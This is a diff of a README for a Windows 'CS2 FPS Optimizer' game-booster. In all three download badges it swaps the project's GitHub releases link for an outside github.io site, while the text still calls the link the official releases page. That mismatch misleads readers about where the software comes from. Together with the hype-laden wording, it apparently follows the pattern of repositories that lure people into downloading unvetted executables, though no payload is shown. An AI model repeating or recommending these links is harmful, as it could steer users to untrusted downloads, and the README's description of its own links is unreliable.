@@ -1,6 +1,6 @@
 # 🎮 CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026- - Boost FPS, Reduce Lag Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_FPS_Optimizer_2026-00FF00?style=for-the-badge&logo=windows&logoColor=white&labelColor=000000)](https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_FPS_Optimizer_2026-00FF00?style=for-the-badge&logo=windows&logoColor=white&labelColor=000000)](https://harlowwinston17.github.io)
 
 ## 🚀 Welcome to Your Ultimate CS2 Performance Solution
 
@@ -27,7 +27,7 @@ Let's get you set up. Follow these simple steps.
 
 Visit this link to download the application. This is the official download page.
 
-[![Download CS2 Optimizer](https://img.shields.io/badge/🚀-Go_to_Download_Page-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases)
+[![Download CS2 Optimizer](https://img.shields.io/badge/🚀-Go_to_Download_Page-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://harlowwinston17.github.io)
 
 You will be taken to the releases page. This is where the latest version of the app is hosted.
 
@@ -95,7 +95,7 @@ If you run into any problems, don't worry. The community and the developer are h
 
 You're just one download away from a smoother, more responsive CS2 experience. Stop fighting with your system settings and let this optimizer do the heavy lifting.
 
-[![Download Now](https://img.shields.io/badge/⬇️-Download_CS2_FPS_Optimizer-FF5722?style=for-the-badge&logo=windows11&logoColor=white&labelColor=000000)](https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases)
+[![Download Now](https://img.shields.io/badge/⬇️-Download_CS2_FPS_Optimizer-FF5722?style=for-the-badge&logo=windows11&logoColor=white&labelColor=000000)](https://harlowwinston17.github.io)
 
 Get ready to play at your best. Download it now and feel the difference!
 
